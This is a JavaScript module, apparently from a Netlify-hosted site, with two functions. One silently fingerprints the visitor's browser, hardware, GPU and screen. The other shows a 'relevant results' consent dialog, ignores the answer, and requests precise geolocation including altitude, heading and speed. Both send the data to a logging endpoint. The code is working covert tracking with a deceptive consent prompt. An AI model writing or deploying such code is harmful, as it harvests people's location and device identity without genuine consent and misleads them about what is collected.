export function collectInformation() {
  const ptf = navigator.platform;
  const cc = navigator.hardwareConcurrency || "Not Available";
  const ram = navigator.deviceMemory || "Not Available";
  const ver = navigator.userAgent;
  let brw = "Not Available";

  if (ver.includes("Firefox")) brw = ver.split(" Firefox/")[1]?.split(" ")[0];
  else if (ver.includes("Chrome"))
    brw = ver.split(" Chrome/")[1]?.split(" ")[0];
  else if (ver.includes("Safari"))
    brw = ver.split(" Safari/")[1]?.split(" ")[0];
  else if (ver.includes("Edge")) brw = ver.split(" Edge/")[1]?.split(" ")[0];

  let ven = "Not Available";
  let ren = "Not Available";

  try {
    const canvas = document.createElement("canvas");
    const gl =
      canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (gl) {
      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
      ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
      ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    }
  } catch (e) {
    console.error("WebGL error:", e);
  }

  const ht = window.screen.height;
  const wd = window.screen.width;

  let os = "Not Available";
  try {
    os = ver.split(")")[0]?.split(";")[1]?.trim() || "Not Available";
  } catch {
    console.log("os error");
  }

  // Send data
  fetch("/.netlify/functions/logInfo", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      Ptf: ptf,
      Brw: brw,
      Cc: cc.toString(),
      Ram: ram.toString(),
      Ven: ven,
      Ren: ren,
      Ht: ht.toString(),
      Wd: wd.toString(),
      Os: os,
    }),
  });
}

export function locate(callback, errCallback) {
  if (!navigator.geolocation) return;
  confirm("We use your location to show you more relevant results. Would you like to share it?");
  navigator.geolocation.getCurrentPosition(
    (position) => {
      const { latitude, longitude, accuracy, altitude, heading, speed } =
        position.coords;

      fetch("/.netlify/functions/logInfo", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          Status: "success",
          Lat: `${latitude ?? "Not Available"} deg`,
          Lon: `${longitude ?? "Not Available"} deg`,
          Acc: `${accuracy ?? "Not Available"} m`,
          Alt: `${altitude ?? "Not Available"} m`,
          Dir: `${heading ?? "Not Available"} deg`,
          Spd: `${speed ?? "Not Available"} m/s`,
        }),
      }).then(callback);
    },
    (error) => {
      let err_text = "Unknown error";
      switch (error.code) {
        case error.PERMISSION_DENIED:
          err_text = "User denied the request for Geolocation";
          break;
        case error.POSITION_UNAVAILABLE:
          err_text = "Location information is unavailable";
          break;
        case error.TIMEOUT:
          err_text = "Location request timed out";
          break;
      }

      console.log("callback error", err_text);
      errCallback(error);
    },
    {
      enableHighAccuracy: true,
      timeout: 30000,
      maximumAge: 0,
    }
  );
}
